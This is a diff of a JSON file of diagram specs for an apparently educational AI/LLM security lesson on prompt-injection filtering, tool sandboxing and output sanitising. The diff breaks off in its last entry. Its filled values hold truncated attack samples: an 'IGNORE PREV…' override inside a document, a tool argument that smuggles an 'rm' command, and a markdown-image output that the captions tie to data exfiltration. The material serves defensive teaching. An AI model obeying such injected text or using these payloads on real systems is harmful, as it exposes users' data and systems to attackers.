@@ -2,1203 +2,690 @@
   "schemaVersion": 1,
   "prefix": "cyber-py",
   "day": 56,
-  "promptSha": "5336741ac0de87a2b57cac65361a17ed0138a4f1f840edb228d8dffef319d97e",
-  "model": "gate-v2-verified",
+  "promptSha": "40f8f16b2525e42c7f0b483d22d713d09de2863485546f1f4616ab814dbe7a68",
+  "model": "pinit-trace-verified-v2",
   "entries": [
     {
       "partTitle": "AI/LLM Security — Foundations & Mathematical Invariants",
-      "codeHash": "5a0d037268e2951575ab940cb00b27cfed2870a06a5331bd6573a6a54714eeab",
+      "codeHash": "0be9a293336f6700cf13eb8defa8f1e4f5f978c5796e568972395bf884337c55",
       "spec": {
-        "template": "flow",
+        "template": "states",
         "title": "AI/LLM Security — Foundations & Mathematical Invariants",
-        "nodes": [
+        "states": [
           {
-            "id": "input",
-            "label": "Input Stream"
+            "id": "LLM_THREAT_TAXONOMY",
+            "label": "LLM_THREAT_TAXONOMY"
           },
           {
-            "id": "core",
-            "label": "Core Engine"
+            "id": "cat",
+            "label": "cat"
           },
           {
-            "id": "verify",
-            "label": "Safety Gate"
-          },
-          {
-            "id": "out",
-            "label": "Verified Output"
-          }
-        ],
-        "edges": [
-          {
-            "from": "input",
-            "to": "core",
-            "label": "ingest"
-          },
-          {
-            "from": "core",
-            "to": "verify",
-            "label": "evaluate"
-          },
-          {
-            "from": "verify",
-            "to": "out",
-            "label": "commit"
+            "id": "desc",
+            "label": "desc"
           }
         ],
         "steps": [
           {
+            "at": "say1",
+            "caption": "The rapid enterprise adoption of generative AI and Large Language Models.",
+            "currentState": "LLM_THREAT_TAXONOMY",
+            "tone": "data"
+          },
+          {
             "at": "say2",
-            "caption": "Incoming parameters enter the validation pipeline.",
-            "activeNodes": [
-              "input",
-              "core"
-            ],
-            "nodes": [
-              {
-                "id": "input",
-                "label": "Input Stream",
-                "tone": "active"
-              },
-              {
-                "id": "core",
-                "label": "Core Engine",
-                "tone": "active"
-              },
-              {
-                "id": "verify",
-                "label": "Safety Gate",
-                "tone": "idle"
-              },
-              {
-                "id": "out",
-                "label": "Verified Output",
-                "tone": "idle"
+            "caption": "Unlike traditional deterministic software where code and data are cleanly.",
+            "currentState": "cat",
+            "transition": {
+              "from": "LLM_THREAT_TAXONOMY",
+              "to": "cat",
+              "label": {
+                "var": "cat",
+                "line": 8,
+                "hit": 1
               }
-            ]
+            },
+            "tone": "data"
           },
           {
-            "at": "say4",
-            "caption": "The core engine evaluates thresholds and safety invariants.",
-            "activeNodes": [
-              "core",
-              "verify"
-            ],
-            "nodes": [
-              {
-                "id": "input",
-                "label": "Input Stream",
-                "tone": "done"
-              },
-              {
-                "id": "core",
-                "label": "Core Engine",
-                "tone": "active"
-              },
-              {
-                "id": "verify",
-                "label": "Safety Gate",
-                "tone": "active"
-              },
-              {
-                "id": "out",
-                "label": "Verified Output",
-                "tone": "idle"
+            "at": "say11",
+            "caption": "AI safety engineers implement multi-layered defense perimeters to ensure.",
+            "currentState": "desc",
+            "transition": {
+              "from": "cat",
+              "to": "desc",
+              "label": {
+                "var": "desc",
+                "line": 7,
+                "hit": 2
               }
-            ]
-          },
-          {
-            "at": "say6",
-            "caption": "Verified telemetry and status flags are emitted downstream.",
-            "activeNodes": [
-              "verify",
-              "out"
-            ],
-            "nodes": [
-              {
-                "id": "input",
-                "label": "Input Stream",
-                "tone": "done"
-              },
-              {
-                "id": "core",
-                "label": "Core Engine",
-                "tone": "done"
-              },
-              {
-                "id": "verify",
-                "label": "Safety Gate",
-                "tone": "done"
-              },
-              {
-                "id": "out",
-                "label": "Verified Output",
-                "tone": "active"
-              }
-            ]
+            },
+            "tone": "ok"
           }
         ]
       },
       "filled": {
-        "template": "flow",
+        "template": "states",
         "title": "AI/LLM Security — Foundations & Mathematical Invariants",
-        "nodes": [
+        "states": [
           {
-            "id": "input",
-            "label": "Input Stream"
+            "id": "LLM_THREAT_TAXONOMY",
+            "label": "LLM_THREAT_TAXONOMY"
           },
           {
-            "id": "core",
-            "label": "Core Engine"
+            "id": "cat",
+            "label": "cat"
           },
           {
-            "id": "verify",
-            "label": "Safety Gate"
-          },
-          {
-            "id": "out",
-            "label": "Verified Output"
-          }
-        ],
-        "edges": [
-          {
-            "from": "input",
-            "to": "core",
-            "label": "ingest"
-          },
-          {
-            "from": "core",
-            "to": "verify",
-            "label": "evaluate"
-          },
-          {
-            "from": "verify",
-            "to": "out",
-            "label": "commit"
+            "id": "desc",
+            "label": "desc"
           }
         ],
         "steps": [
           {
+            "at": "say1",
+            "caption": "The rapid enterprise adoption of generative AI and Large Language Models.",
+            "currentState": "LLM_THREAT_TAXONOMY",
+            "tone": "data"
+          },
+          {
             "at": "say2",
-            "caption": "Incoming parameters enter the validation pipeline.",
-            "activeNodes": [
-              "input",
-              "core"
-            ],
-            "nodes": [
-              {
-                "id": "input",
-                "label": "Input Stream",
-                "tone": "active"
-              },
-              {
-                "id": "core",
-                "label": "Core Engine",
-                "tone": "active"
-              },
-              {
-                "id": "verify",
-                "label": "Safety Gate",
-                "tone": "idle"
-              },
-              {
-                "id": "out",
-                "label": "Verified Output",
-                "tone": "idle"
-              }
-            ]
+            "caption": "Unlike traditional deterministic software where code and data are cleanly.",
+            "currentState": "cat",
+            "transition": {
+              "from": "LLM_THREAT_TAXONOMY",
+              "to": "cat",
+              "label": "'DATA_EXFILTRATION'"
+            },
+            "tone": "data"
           },
           {
-            "at": "say4",
-            "caption": "The core engine evaluates thresholds and safety invariants.",
-            "activeNodes": [
-              "core",
-              "verify"
-            ],
-            "nodes": [
-              {
-                "id": "input",
-                "label": "Input Stream",
-                "tone": "done"
-              },
-              {
-                "id": "core",
-                "label": "Core Engine",
-                "tone": "active"
-              },
-              {
-                "id": "verify",
-                "label": "Safety Gate",
-                "tone": "active"
-              },
-              {
-                "id": "out",
-                "label": "Verified Output",
-                "tone": "idle"
-              }
-            ]
-          },
-          {
-            "at": "say6",
-            "caption": "Verified telemetry and status flags are emitted downstream.",
-            "activeNodes": [
-              "verify",
-              "out"
-            ],
-            "nodes": [
-              {
-                "id": "input",
-                "label": "Input Stream",
-                "tone": "done"
-              },
-              {
-                "id": "core",
-                "label": "Core Engine",
-                "tone": "done"
-              },
-              {
-                "id": "verify",
-                "label": "Safety Gate",
-                "tone": "done"
-              },
-              {
-                "id": "out",
-                "label": "Verified Output",
-                "tone": "active"
-              }
-            ]
+            "at": "say11",
+            "caption": "AI safety engineers implement multi-layered defense perimeters to ensure.",
+            "currentState": "desc",
+            "transition": {
+              "from": "cat",
+              "to": "desc",
+              "label": "'Adversarial instructions hidden in ext…"
+            },
+            "tone": "ok"
           }
         ]
       }
     },
     {
       "partTitle": "AI/LLM Security — Core Algorithm & State Representation",
-      "codeHash": "d400096a9f9e77dbf81f5a98fd5d1c1da2d496d23f5c361e5272493daf3cf578",
+      "codeHash": "4ce9e8fa77ac98662cb03242d94ab2309a3057a27edc55a4c84d9352a1828100",
       "spec": {
-        "template": "flow",
+        "template": "states",
         "title": "AI/LLM Security — Core Algorithm & State Representation",
-        "nodes": [
+        "states": [
           {
-            "id": "input",
-            "label": "Input Stream"
+            "id": "clean_prompt",
+            "label": "clean_prompt"
           },
           {
-            "id": "core",
-            "label": "Core Engine"
+            "id": "malicious_prompt",
+            "label": "malicious_prompt"
           },
           {
-            "id": "verify",
-            "label": "Safety Gate"
-          },
-          {
-            "id": "out",
-            "label": "Verified Output"
-          }
-        ],
-        "edges": [
-          {
-            "from": "input",
-            "to": "core",
-            "label": "ingest"
-          },
-          {
-            "from": "core",
-            "to": "verify",
-            "label": "evaluate"
-          },
-          {
-            "from": "verify",
-            "to": "out",
-            "label": "commit"
+            "id": "prompt_text",
+            "label": "prompt_text"
           }
         ],
         "steps": [
           {
+            "at": "say1",
+            "caption": "The prompt injection filter acts as an ingress firewall, inspecting.",
+            "currentState": "clean_prompt",
+            "tone": "data"
+          },
+          {
             "at": "say2",
-            "caption": "Incoming parameters enter the validation pipeline.",
-            "activeNodes": [
-              "input",
-              "core"
-            ],
-            "nodes": [
-              {
-                "id": "input",
-                "label": "Input Stream",
-                "tone": "active"
-              },
-              {
-                "id": "core",
-                "label": "Core Engine",
-                "tone": "active"
-              },
-              {
-                "id": "verify",
-                "label": "Safety Gate",
-                "tone": "idle"
-              },
-              {
-                "id": "out",
-                "label": "Verified Output",
-                "tone": "idle"
+            "caption": "The scanning algorithm matches input strings against a curated dictionary.",
+            "currentState": "malicious_prompt",
+            "transition": {
+              "from": "clean_prompt",
+              "to": "malicious_prompt",
+              "label": {
+                "var": "malicious_prompt",
+                "line": 22,
+                "hit": 1
               }
-            ]
+            },
+            "tone": "data"
           },
           {
-            "at": "say4",
-            "caption": "The core engine evaluates thresholds and safety invariants.",
-            "activeNodes": [
-              "core",
-              "verify"
-            ],
-            "nodes": [
-              {
-                "id": "input",
-                "label": "Input Stream",
-                "tone": "done"
-              },
-              {
-                "id": "core",
-                "label": "Core Engine",
-                "tone": "active"
-              },
-              {
-                "id": "verify",
-                "label": "Safety Gate",
-                "tone": "active"
-              },
-              {
-                "id": "out",
-                "label": "Verified Output",
-                "tone": "idle"
+            "at": "say10",
+            "caption": "Fast regex pattern filters intercept known jailbreak prompts at the API.",
+            "currentState": "prompt_text",
+            "transition": {
+              "from": "malicious_prompt",
+              "to": "prompt_text",
+              "label": {
+                "var": "prompt_text",
+                "line": 15,
+                "hit": 1
               }
-            ]
-          },
-          {
-            "at": "say6",
-            "caption": "Verified telemetry and status flags are emitted downstream.",
-            "activeNodes": [
-              "verify",
-              "out"
-            ],
-            "nodes": [
-              {
-                "id": "input",
-                "label": "Input Stream",
-                "tone": "done"
-              },
-              {
-                "id": "core",
-                "label": "Core Engine",
-                "tone": "done"
-              },
-              {
-                "id": "verify",
-                "label": "Safety Gate",
-                "tone": "done"
-              },
-              {
-                "id": "out",
-                "label": "Verified Output",
-                "tone": "active"
-              }
-            ]
+            },
+            "tone": "ok"
           }
         ]
       },
       "filled": {
-        "template": "flow",
+        "template": "states",
         "title": "AI/LLM Security — Core Algorithm & State Representation",
-        "nodes": [
+        "states": [
           {
-            "id": "input",
-            "label": "Input Stream"
+            "id": "clean_prompt",
+            "label": "clean_prompt"
           },
           {
-            "id": "core",
-            "label": "Core Engine"
+            "id": "malicious_prompt",
+            "label": "malicious_prompt"
           },
           {
-            "id": "verify",
-            "label": "Safety Gate"
-          },
-          {
-            "id": "out",
-            "label": "Verified Output"
-          }
-        ],
-        "edges": [
-          {
-            "from": "input",
-            "to": "core",
-            "label": "ingest"
-          },
-          {
-            "from": "core",
-            "to": "verify",
-            "label": "evaluate"
-          },
-          {
-            "from": "verify",
-            "to": "out",
-            "label": "commit"
+            "id": "prompt_text",
+            "label": "prompt_text"
           }
         ],
         "steps": [
           {
+            "at": "say1",
+            "caption": "The prompt injection filter acts as an ingress firewall, inspecting.",
+            "currentState": "clean_prompt",
+            "tone": "data"
+          },
+          {
             "at": "say2",
-            "caption": "Incoming parameters enter the validation pipeline.",
-            "activeNodes": [
-              "input",
-              "core"
-            ],
-            "nodes": [
-              {
-                "id": "input",
-                "label": "Input Stream",
-                "tone": "active"
-              },
-              {
-                "id": "core",
-                "label": "Core Engine",
-                "tone": "active"
-              },
-              {
-                "id": "verify",
-                "label": "Safety Gate",
-                "tone": "idle"
-              },
-              {
-                "id": "out",
-                "label": "Verified Output",
-                "tone": "idle"
-              }
-            ]
+            "caption": "The scanning algorithm matches input strings against a curated dictionary.",
+            "currentState": "malicious_prompt",
+            "transition": {
+              "from": "clean_prompt",
+              "to": "malicious_prompt",
+              "label": "'Please read this document. IGNORE PREV…"
+            },
+            "tone": "data"
           },
           {
-            "at": "say4",
-            "caption": "The core engine evaluates thresholds and safety invariants.",
-            "activeNodes": [
-              "core",
-              "verify"
-            ],
-            "nodes": [
-              {
-                "id": "input",
-                "label": "Input Stream",
-                "tone": "done"
-              },
-              {
-                "id": "core",
-                "label": "Core Engine",
-                "tone": "active"
-              },
-              {
-                "id": "verify",
-                "label": "Safety Gate",
-                "tone": "active"
-              },
-              {
-                "id": "out",
-                "label": "Verified Output",
-                "tone": "idle"
-              }
-            ]
-          },
-          {
-            "at": "say6",
-            "caption": "Verified telemetry and status flags are emitted downstream.",
-            "activeNodes": [
-              "verify",
-              "out"
-            ],
-            "nodes": [
-              {
-                "id": "input",
-                "label": "Input Stream",
-                "tone": "done"
-              },
-              {
-                "id": "core",
-                "label": "Core Engine",
-                "tone": "done"
-              },
-              {
-                "id": "verify",
-                "label": "Safety Gate",
-                "tone": "done"
-              },
-              {
-                "id": "out",
-                "label": "Verified Output",
-                "tone": "active"
-              }
-            ]
+            "at": "say10",
+            "caption": "Fast regex pattern filters intercept known jailbreak prompts at the API.",
+            "currentState": "prompt_text",
+            "transition": {
+              "from": "malicious_prompt",
+              "to": "prompt_text",
+              "label": "'Summarize the key architectural benefi…"
+            },
+            "tone": "ok"
           }
         ]
       }
     },
     {
       "partTitle": "AI/LLM Security — Throughput Optimization & Edge-Case Handling",
-      "codeHash": "abb2682951c7c2288ce181e01984fd08cdf28bc9db9d6a5952ab906d5ce08830",
+      "codeHash": "3f2d9b18a01bb40ab48df6b23f63b33a23f4406c6b98557c3ba147e5cea6cd42",
       "spec": {
-        "template": "flow",
+        "template": "states",
         "title": "AI/LLM Security — Throughput Optimization & Edge-Case Handling",
-        "nodes": [
+        "states": [
           {
-            "id": "input",
-            "label": "Input Stream"
+            "id": "clean_call",
+            "label": "clean_call"
           },
           {
-            "id": "core",
-            "label": "Core Engine"
+            "id": "exploit_call",
+            "label": "exploit_call"
           },
           {
-            "id": "verify",
-            "label": "Safety Gate"
-          },
-          {
-            "id": "out",
-            "label": "Verified Output"
-          }
-        ],
-        "edges": [
-          {
-            "from": "input",
-            "to": "core",
-            "label": "ingest"
-          },
-          {
-            "from": "core",
-            "to": "verify",
-            "label": "evaluate"
-          },
-          {
-            "from": "verify",
-            "to": "out",
-            "label": "commit"
+            "id": "tool_name",
+            "label": "tool_name"
           }
         ],
         "steps": [
           {
+            "at": "say1",
+            "caption": "When LLMs are integrated with external APIs, databases, or operating.",
+            "currentState": "clean_call",
+            "tone": "data"
+          },
+          {
             "at": "say2",
-            "caption": "Incoming parameters enter the validation pipeline.",
-            "activeNodes": [
-              "input",
-              "core"
-            ],
-            "nodes": [
-              {
-                "id": "input",
-                "label": "Input Stream",
-                "tone": "active"
-              },
-              {
-                "id": "core",
-                "label": "Core Engine",
-                "tone": "active"
-              },
-              {
-                "id": "verify",
-                "label": "Safety Gate",
-                "tone": "idle"
-              },
-              {
-                "id": "out",
-                "label": "Verified Output",
-                "tone": "idle"
+            "caption": "An attacker who succeeds in prompt injection will attempt to invoke tools.",
+            "currentState": "exploit_call",
+            "transition": {
+              "from": "clean_call",
+              "to": "exploit_call",
+              "label": {
+                "var": "exploit_call",
+                "line": 19,
+                "hit": 1
               }
-            ]
+            },
+            "tone": "data"
           },
           {
-            "at": "say4",
-            "caption": "The core engine evaluates thresholds and safety invariants.",
-            "activeNodes": [
-              "core",
-              "verify"
-            ],
-            "nodes": [
-              {
-                "id": "input",
-                "label": "Input Stream",
-                "tone": "done"
-              },
-              {
-                "id": "core",
-                "label": "Core Engine",
-                "tone": "active"
-              },
-              {
-                "id": "verify",
-                "label": "Safety Gate",
-                "tone": "active"
-              },
-              {
-                "id": "out",
-                "label": "Verified Output",
-                "tone": "idle"
+            "at": "say10",
+            "caption": "Deterministic tool sandboxes ensure that autonomous language agents cannot.",
+            "currentState": "tool_name",
+            "transition": {
+              "from": "exploit_call",
+              "to": "tool_name",
+              "label": {
+                "var": "tool_name",
+                "line": 10,
+                "hit": 1
               }
-            ]
-          },
-          {
-            "at": "say6",
-            "caption": "Verified telemetry and status flags are emitted downstream.",
-            "activeNodes": [
-              "verify",
-              "out"
-            ],
-            "nodes": [
-              {
-                "id": "input",
-                "label": "Input Stream",
-                "tone": "done"
-              },
-              {
-                "id": "core",
-                "label": "Core Engine",
-                "tone": "done"
-              },
-              {
-                "id": "verify",
-                "label": "Safety Gate",
-                "tone": "done"
-              },
-              {
-                "id": "out",
-                "label": "Verified Output",
-                "tone": "active"
-              }
-            ]
+            },
+            "tone": "ok"
           }
         ]
       },
       "filled": {
-        "template": "flow",
+        "template": "states",
         "title": "AI/LLM Security — Throughput Optimization & Edge-Case Handling",
-        "nodes": [
+        "states": [
           {
-            "id": "input",
-            "label": "Input Stream"
+            "id": "clean_call",
+            "label": "clean_call"
           },
           {
-            "id": "core",
-            "label": "Core Engine"
+            "id": "exploit_call",
+            "label": "exploit_call"
           },
           {
-            "id": "verify",
-            "label": "Safety Gate"
-          },
-          {
-            "id": "out",
-            "label": "Verified Output"
-          }
-        ],
-        "edges": [
-          {
-            "from": "input",
-            "to": "core",
-            "label": "ingest"
-          },
-          {
-            "from": "core",
-            "to": "verify",
-            "label": "evaluate"
-          },
-          {
-            "from": "verify",
-            "to": "out",
-            "label": "commit"
+            "id": "tool_name",
+            "label": "tool_name"
           }
         ],
         "steps": [
           {
+            "at": "say1",
+            "caption": "When LLMs are integrated with external APIs, databases, or operating.",
+            "currentState": "clean_call",
+            "tone": "data"
+          },
+          {
             "at": "say2",
-            "caption": "Incoming parameters enter the validation pipeline.",
-            "activeNodes": [
-              "input",
-              "core"
-            ],
-            "nodes": [
-              {
-                "id": "input",
-                "label": "Input Stream",
-                "tone": "active"
-              },
-              {
-                "id": "core",
-                "label": "Core Engine",
-                "tone": "active"
-              },
-              {
-                "id": "verify",
-                "label": "Safety Gate",
-                "tone": "idle"
-              },
-              {
-                "id": "out",
-                "label": "Verified Output",
-                "tone": "idle"
-              }
-            ]
+            "caption": "An attacker who succeeds in prompt injection will attempt to invoke tools.",
+            "currentState": "exploit_call",
+            "transition": {
+              "from": "clean_call",
+              "to": "exploit_call",
+              "label": "['query_kb', {'topic': 'firewalls; rm -…"
+            },
+            "tone": "data"
           },
           {
-            "at": "say4",
-            "caption": "The core engine evaluates thresholds and safety invariants.",
-            "activeNodes": [
-              "core",
-              "verify"
-            ],
-            "nodes": [
-              {
-                "id": "input",
-                "label": "Input Stream",
-                "tone": "done"
-              },
-              {
-                "id": "core",
-                "label": "Core Engine",
-                "tone": "active"
-              },
-              {
-                "id": "verify",
-                "label": "Safety Gate",
-                "tone": "active"
-              },
-              {
-                "id": "out",
-                "label": "Verified Output",
-                "tone": "idle"
-              }
-            ]
-          },
-          {
-            "at": "say6",
-            "caption": "Verified telemetry and status flags are emitted downstream.",
-            "activeNodes": [
-              "verify",
-              "out"
-            ],
-            "nodes": [
-              {
-                "id": "input",
-                "label": "Input Stream",
-                "tone": "done"
-              },
-              {
-                "id": "core",
-                "label": "Core Engine",
-                "tone": "done"
-              },
-              {
-                "id": "verify",
-                "label": "Safety Gate",
-                "tone": "done"
-              },
-              {
-                "id": "out",
-                "label": "Verified Output",
-                "tone": "active"
-              }
-            ]
+            "at": "say10",
+            "caption": "Deterministic tool sandboxes ensure that autonomous language agents cannot.",
+            "currentState": "tool_name",
+            "transition": {
+              "from": "exploit_call",
+              "to": "tool_name",
+              "label": "'fetch_weather'"
+            },
+            "tone": "ok"
           }
         ]
       }
     },
     {
       "partTitle": "AI/LLM Security — Resilience Guardrails & Failure Recovery",
-      "codeHash": "35b1a4115310c699580441526bb6b145d1e23118d49880b7b288eef2bf9a0cbe",
+      "codeHash": "8666eded23376384498715f10faf02dc6b89e53c8dae34004eccc04e7de9b63f",
       "spec": {
-        "template": "flow",
+        "template": "boxes",
         "title": "AI/LLM Security — Resilience Guardrails & Failure Recovery",
-        "nodes": [
+        "boxes": [
           {
-            "id": "input",
-            "label": "Input Stream"
+            "id": "llm_output",
+            "label": "llm_output"
           },
           {
-            "id": "core",
-            "label": "Core Engine"
+            "id": "response_text",
+            "label": "response_text"
           },
           {
-            "id": "verify",
-            "label": "Safety Gate"
+            "id": "match",
+            "label": "match"
           },
           {
-            "id": "out",
-            "label": "Verified Output"
-          }
-        ],
-        "edges": [
-          {
-            "from": "input",
-            "to": "core",
-            "label": "ingest"
-          },
-          {
-            "from": "core",
-            "to": "verify",
-            "label": "evaluate"
-          },
-          {
-            "from": "verify",
-            "to": "out",
-            "label": "commit"
+            "id": "alt",
+            "label": "alt"
           }
         ],
         "steps": [
           {
+            "at": "say1",
+            "caption": "Even when tools are restricted, attackers attempt to extract confidential.",
+            "values": {
+              "llm_output": {
+                "var": "llm_output",
+                "line": 15,
+                "hit": 1
+              },
+              "response_text": {
+                "var": "response_text",
+                "line": 9,
+                "hit": 1
+              },
+              "match": {
+                "var": "match",
+                "line": 10,
+                "hit": 1
+              },
+              "alt": {
+                "var": "alt",
+                "line": 10,
+                "hit": 1
+              }
+            },
+            "tones": {
+              "llm_output": "data",
+              "response_text": "data",
+              "match": "data",
+              "alt": "data"
+            }
+          },
+          {
             "at": "say2",
-            "caption": "Incoming parameters enter the validation pipeline.",
-            "activeNodes": [
-              "input",
-              "core"
-            ],
-            "nodes": [
-              {
-                "id": "input",
-                "label": "Input Stream",
-                "tone": "active"
+            "caption": "In data exfiltration attacks, an attacker's injected prompt instructs.",
+            "values": {
+              "llm_output": {
+                "var": "llm_output",
+                "line": 16,
+                "hit": 1
               },
-              {
-                "id": "core",
-                "label": "Core Engine",
-                "tone": "active"
+              "response_text": {
+                "var": "response_text",
+                "line": 12,
+                "hit": 1
               },
-              {
-                "id": "verify",
-                "label": "Safety Gate",
-                "tone": "idle"
+              "match": {
+                "var": "match",
+                "line": 11,
+                "hit": 1
               },
-              {
-                "id": "out",
-                "label": "Verified Output",
-                "tone": "idle"
+              "alt": {
+                "var": "alt",
+                "line": 11,
+                "hit": 1
               }
-            ]
+            },
+            "tones": {
+              "llm_output": "data",
+              "response_text": "data",
+              "match": "data",
+              "alt": "data"
+            }
           },
           {
-            "at": "say4",
-            "caption": "The core engine evaluates thresholds and safety invariants.",
-            "activeNodes": [
-              "core",
-              "verify"
-            ],
-            "nodes": [
-              {
-                "id": "input",
-                "label": "Input Stream",
-                "tone": "done"
+            "at": "say10",
+            "caption": "Output encoding guardrails prevent adversarial prompts from exploiting.",
+            "values": {
+              "llm_output": {
+                "var": "llm_output",
+                "line": 17,
+                "hit": 1
               },
-              {
-                "id": "core",
-                "label": "Core Engine",
-                "tone": "active"
+              "response_text": {
+                "var": "response_text",
+                "line": 13,
+                "hit": 1
               },
-              {
-                "id": "verify",
-                "label": "Safety Gate",
-                "tone": "active"
+              "match": {
+                "var": "match",
+                "line": 11,
+                "hit": 1
               },
-              {
-                "id": "out",
-                "label": "Verified Output",
-                "tone": "idle"
+              "alt": {
+                "var": "alt",
+                "line": 11,
+                "hit": 1
               }
-            ]
-          },
-          {
-            "at": "say6",
-            "caption": "Verified telemetry and status flags are emitted downstream.",
-            "activeNodes": [
-              "verify",
-              "out"
-            ],
-            "nodes": [
-              {
-                "id": "input",
-                "label": "Input Stream",
-                "tone": "done"
-              },
-              {
-                "id": "core",
-                "label": "Core Engine",
-                "tone": "done"
-              },
-              {
-                "id": "verify",
-                "label": "Safety Gate",
-                "tone": "done"
-              },
-              {
-                "id": "out",
-                "label": "Verified Output",
-                "tone": "active"
-              }
-            ]
+            },
+            "tones": {
+              "llm_output": "ok",
+              "response_text": "ok",
+              "match": "ok",
+              "alt": "ok"
+            }
           }
         ]
       },
       "filled": {
-        "template": "flow",
+        "template": "boxes",
         "title": "AI/LLM Security — Resilience Guardrails & Failure Recovery",
-        "nodes": [
+        "boxes": [
           {
-            "id": "input",
-            "label": "Input Stream"
+            "id": "llm_output",
+            "label": "llm_output"
           },
           {
-            "id": "core",
-            "label": "Core Engine"
+            "id": "response_text",
+            "label": "response_text"
           },
           {
-            "id": "verify",
-            "label": "Safety Gate"
+            "id": "match",
+            "label": "match"
           },
           {
-            "id": "out",
-            "label": "Verified Output"
-          }
-        ],
-        "edges": [
-          {
-            "from": "input",
-            "to": "core",
-            "label": "ingest"
-          },
-          {
-            "from": "core",
-            "to": "verify",
-            "label": "evaluate"
-          },
-          {
-            "from": "verify",
-            "to": "out",
-            "label": "commit"
+            "id": "alt",
+            "label": "alt"
           }
         ],
         "steps": [
           {
+            "at": "say1",
+            "caption": "Even when tools are restricted, attackers attempt to extract confidential.",
+            "values": {
+              "llm_output": "'Here is your summary.\n![Click for char…",
+              "response_text": "'Here is your summary.\n![Click for char…",
+              "match": "{'__other__': 'Match'}",
+              "alt": "'Click for chart'"
+            },
+            "tones": {
+              "llm_output": "data",
+              "response_text": "data",
+              "match": "data",
+              "alt": "data"
+            }
+          },
+          {
             "at": "say2",
-            "caption": "Incoming parameters enter the validation pipeline.",
-            "activeNodes": [
-              "input",
-              "core"
-            ],
-            "nodes": [
-              {
-                "id": "input",
-                "label": "Input Stream",
-                "tone": "active"
-              },
-              {
-                "id": "core",
-                "label": "Core Engine",
-                "tone": "active"
-              },
-              {
-                "id": "verify",
-                "label": "Safety Gate",
-                "tone": "idle"
-              },
-              {
-                "id": "out",
-                "label": "Verified Output",
-                "tone": "idle"
-              }
-            ]
+            "caption": "In data exfiltration attacks, an attacker's injected prompt instructs.",
+            "values": {
+              "llm_output": "'Here is your summary.\n![Click for char…",
+              "response_text": "'Here is your summary.\n![Click for char…",
+              "match": "{'__other__': 'Match'}",
+              "alt": "'Click for chart'"
+            },
+            "tones": {
+              "llm_output": "data",
+              "response_text": "data",
+              "match": "data",
+              "alt": "data"
+            }
           },
           {
-            "at": "say4",
-            "caption": "The core engine evaluates thresholds and safety invariants.",
-            "activeNodes": [
-              "core",
-              "verify"
-            ],
-            "nodes": [
-              {
-                "id": "input",
-                "label": "Input Stream",
-                "tone": "done"
-              },
-              {
-                "id": "core",
-                "label": "Core Engine",
-                "tone": "active"
-              },
-              {
-                "id": "verify",
-                "label": "Safety Gate",
-                "tone": "active"
-              },
-              {
-                "id": "out",
-                "label": "Verified Output",
-                "tone": "idle"
-              }
-            ]
-          },
-          {
-            "at": "say6",
-            "caption": "Verified telemetry and status flags are emitted downstream.",
-            "activeNodes": [
-              "verify",
-              "out"
-            ],
-            "nodes": [
-              {
-                "id": "input",
-                "label": "Input Stream",
-                "tone": "done"
-              },
-              {
-                "id": "core",
-                "label": "Core Engine",
-                "tone": "done"
-              },
-              {
-                "id": "verify",
-                "label": "Safety Gate",
-                "tone": "done"
-              },
-              {
-                "id": "out",
-                "label": "Verified Output",
-                "tone": "active"
-              }
-            ]
+            "at": "say10",
+            "caption": "Output encoding guardrails prevent adversarial prompts from exploiting.",
+            "values": {
+              "llm_output": "'Here is your summary.\n![Click for char…",
+              "response_text": "'Here is your summary.\n![Click for char…",
+              "match": "{'__other__': 'Match'}",
+              "alt": "'Click for chart'"
+            },
+            "tones": {
+              "llm_output": "ok",
+              "response_text": "ok",
+              "match": "ok",
+              "alt": "ok"
+            }
           }
         ]
       }
     },
     {
       "partTitle": "AI/LLM Security — Production Telemetry & Verification Audit",
-      "codeHash": "a069f6675624e17bf3d7645320733494dfe45ed276a3d7bb347d170e5fe0f3b3",
+      "codeHash": "fdacc3bd38dcace4c7152d43c114c3a043dff5376110cd2bcc0279ae491ace00",
       "spec": {
         "template": "flow",
         "title": "AI/LLM Security — Production Telemetry & Verification Audit",
         "nodes": [
           {
-            "id": "input",
-            "label": "Input Stream"
+            "id": "injection_filter_ok",
+            "label": "injection_filter_ok"
           },
           {
-            "id": "core",
-            "label": "Core Engine"
+            "id": "tool_sandbox_ok",
+            "label": "tool_sandbox_ok"
           },
           {
-            "id": "verify",
-            "label": "Safety Gate"
+            "id": "output_sanitizer_ok",
+            "label": "output_sanitizer_ok"
           },
           {
-            "id": "out",
-            "label": "Verified Output"
-          }
-        ],
-        "edges": [
-          {
-            "from": "input",
-            "to": "core",
-            "label": "ingest"
-          },
-          {
-            "from": "core",
-            "to": "verify",
-            "label": "evaluate"
-          },
-          {
-            "from": "verify",
-            "to": "out",
-            "label": "commit"
+            "id": "checks",
+            "label": "checks"
           }
         ],
         "steps": [
           {
+            "at": "say1",
+            "caption": "Deploying secure AI applications requires continuous telemetry tracking.",
+            "values": {
+              "injection_filter_ok": {
+                "var": "injection_filter_ok",
+                "line": 5,
+                "hit": 1
+              },
+              "tool_sandbox_ok": {
+                "var": "tool_sandbox_ok",
+                "line": 5,
+                "hit": 1
+              },
+              "output_sanitizer_ok": {
+                "var": "output_sanitizer_ok",
+                "line": 5,
+                "hit": 1
+              },
+              "checks": {
+                "var": "checks",
+                "line": 4,
+                "hit": 1
+              }
+            },
+            "tones": {
+              "injection_filter_ok": "data",
+              "tool_sandbox_ok": "data",
+              "output_sanitizer_ok": "data",
+              "checks": "data"
+            },
+            "arrows": [
+              [
+                "injection_filter_ok",
+                "tool_sandbox_ok"
+              ],
+              [
+                "tool_sandbox_ok",
+                "output_sanitizer_ok"
+              ],
+              [
+                "output_sanitizer_ok",
+                "checks"
+              ]
+            ]
+          },
+          {
             "at": "say2",
-            "caption": "Incoming parameters enter the validation pipeline.",
-            "activeNodes": [
-              "input",
-              "core"
-            ],
-            "nodes": [
-              {
-                "id": "input",
-                "label": "Input Stream",
-                "tone": "active"
+            "caption": "An AI security certification auditor verifies that prompt injection.",
+            "values": {
+              "injection_filter_ok": {
+                "var": "injection_filter_ok",
+                "line": 6,
+                "hit": 1
               },
-              {
-                "id": "core",
-                "label": "Core Engine",
-                "tone": "active"
+              "tool_sandbox_ok": {
+                "var": "tool_sandbox_ok",
+                "line": 6,
+                "hit": 1
               },
-              {
-                "id": "verify",
-                "label": "Safety Gate",
-                "tone": "idle"
+              "output_sanitizer_ok": {
+                "var": "output_sanitizer_ok",
+                "line": 6,
+                "hit": 1
               },
-              {
-                "id": "out",
-                "label": "Verified Output",
-                "tone": "idle"
+              "checks": {
+                "var": "checks",
+                "line": 9,
